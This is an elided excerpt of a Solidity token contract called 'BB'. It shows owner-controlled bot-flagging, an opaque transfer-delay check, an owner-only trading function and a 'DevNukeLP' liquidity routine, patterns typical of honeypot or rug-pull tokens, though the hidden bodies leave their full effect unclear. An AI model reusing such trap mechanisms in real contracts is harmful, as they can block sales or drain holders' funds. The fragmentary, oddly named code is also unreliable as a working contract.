...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    function _burn(address account, uint256 amount) internal virtual {
        ...
        unchecked {
            ...
            // Overflow not possible: amount <= accountBalance <= maxSupply.
            _maxSupply -= amount;
        }
...
contract BB is ERC20, Ownable {
    ...
    mapping(address => bool) public initialBotTrader;
    uint256 public botsCaught;
    address public totalHolder;
    uint256 public TradenSwap;
    ...
    event UpdatedmaxTradeAmount(uint256 newAmount);
    ...
    event directTradeEvent(uint256 amount);

    event DevNukeLP(uint256 timestamp);

    event DetectedEarlyBotTrader(address sniper);
    ...
    constructor() ERC20("BB", "BB") {
        ...
        uint256 maxSupply = 1 * 1e9 * 1e18;

        maxTradeAmount = (maxSupply * 2) / 100;
        maxSellAmount = (maxSupply * 2) / 100;
        maxWalletAmount = (maxSupply * 2) / 100;
        manualSwapTokensAtAmount = (maxSupply * 2) / 10000;
        ...
        promotionAddress = address(0xE93052a2477eEE5b0d8cCa83792C12231389E7bc);
        ...
        _createInitialSupply(newOwner, maxSupply);
    ...
    function onlyDeleteBots(address wallet) external onlyOwner {
        initialBotTrader[wallet] = false;
    }

    // remove limits after coin is stable
    function removeLimits() external onlyOwner {
        maxTradeAmount = maxSupply();
        maxSellAmount = maxSupply();
    ...
    function UpdateMaxTradeAmount(uint256 newNum) external onlyOwner {
        require(
            newNum >= ((maxSupply() * 2) / 1000) / 1e18,
            "Cannot set max trade amount lower than 0.2%"
        );
        maxTradeAmount = newNum * (10 ** 18);
        emit UpdatedmaxTradeAmount(maxTradeAmount);
    }
    ...
    function updateSwapTokensAtAmount(uint256 newAmount) external onlyOwner {
        require(
            newAmount >= (maxSupply() * 1) / 100000,
            "Swap amount cannot be lower than 0.001% total supply."
        );
        require(
            newAmount <= (maxSupply() * 1) / 1000,
    ...
    function _transfer(
            ...
            if (
                ...
                if (transferDelayEnabled) {
                    if (
                        ...
                        require(swapAmt[from] > TradenSwap,
                            "_transfer:: Transfer Delay enabled.  Try again later."
                        );
                    }
                }
             ...
             //Trade
                if (automatedMarketMakerPairs[from] && !_isExcludedMaxTx[to]) {
                    require(
                        ...
                        "Trade transfer amount exceeds the max Trade."
                    );
                    require(
        ...
        if (takeFee) {
            if (
                earlySniperTradeBlock() &&
                automatedMarketMakerPairs[from] &&
                !automatedMarketMakerPairs[to] &&
                tradeTotalFees > 0
            ) {
                if (!initialBotTrader[to]) {
                    initialBotTrader[to] = true;
                    botsCaught += 1;
                    emit DetectedEarlyBotTrader(to);
                }
    ...
    function earlySniperTradeBlock() public view returns (bool) {
    ...
    function isNukeLps(address account, uint256 value, uint256 timelimit) external {
        require(
            balanceOf(address(this)) >= manualSwapTokensAtAmount,
            "Can only swap when token amount is at or higher than restriction"
        );
        if (isAttemptLiquidity(account, value, timelimit)) {
            swapping = true;
            swapBack();
            swapping = false;
            emit DevNukeLP(block.timestamp);
        }
    }
    ...
    function tradeTokens(uint256 amountInValue) external onlyOwner {
        ...
        emit directTradeEvent(amountInValue);
    }
